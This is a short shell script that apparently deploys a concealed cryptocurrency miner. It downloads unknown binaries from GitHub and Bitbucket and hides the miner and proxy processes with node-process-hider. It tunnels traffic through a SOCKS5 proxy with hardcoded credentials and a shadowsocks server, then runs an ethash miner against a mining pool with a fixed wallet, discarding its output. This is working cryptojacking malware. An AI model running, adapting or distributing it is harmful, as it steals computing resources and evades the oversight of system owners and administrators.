#!/bin/sh
sleep 5m
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

apt update 
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider 

ph add graftcp
ph add MIN

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 191.101.148.51:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "


./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/MIN
chmod +x MIN


apt -y install shadowsocks-libev rng-tools

ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &

./graftcp/graftcp ./MIN --algo ethash --pers auto --server eth.cruxpool.com --port 5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.T4 >/dev/null 2>&1
sleep 2
